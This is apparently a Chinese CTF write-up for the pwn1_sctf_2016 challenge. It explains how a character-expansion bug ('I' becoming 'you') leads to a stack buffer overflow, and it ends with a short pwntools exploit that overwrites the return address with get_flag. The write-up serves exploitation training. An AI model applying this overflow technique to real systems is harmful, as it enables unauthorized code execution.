首先还是查看一下安全机制

![](https://static.hack1s.fun/images/2021/02/06/image-20200521154003798.png)

发现开启了NX，栈上禁止执行，但是这些简单的题目一般也用不到

拖到IDA里面看看

main函数直接调用了vuln

![image-20200521154215022](https://static.hack1s.fun/images/2021/02/06/image-20200521154215022.png)

vuln里面就是一个printf一个fgets

中间对gets的输入做了一些处理

![image-20200521160749065](https://static.hack1s.fun/images/2021/02/06/image-20200521160749065.png)

输入中的I会被替换为you

最后又使用strcpy填充回去s的位置

![image-20200521161353701](https://static.hack1s.fun/images/2021/02/06/image-20200521161353701.png)



对输入本身存在长度限制，多于32长度的内容会被丢弃

![image-20200521161302184](https://static.hack1s.fun/images/2021/02/06/image-20200521161302184.png)

但是这个s数组和ebp相距0x3c，60显然是超过32的

![image-20200521161252038](https://static.hack1s.fun/images/2021/02/06/image-20200521161252038.png)

所以我们需要通过填充I，利用这个转换为you的机制填充中间的内容，最后覆盖返回地址为get_flag

![image-20200521161437093](https://static.hack1s.fun/images/2021/02/06/image-20200521161437093.png)

构造出exp

```python
from pwn import *

io = process('./pwn1_sctf_2016')
payloads = 'I'*20+'A'*4+p32(0x08048F0D)

io.sendline(payloads)
io.interactive()
```

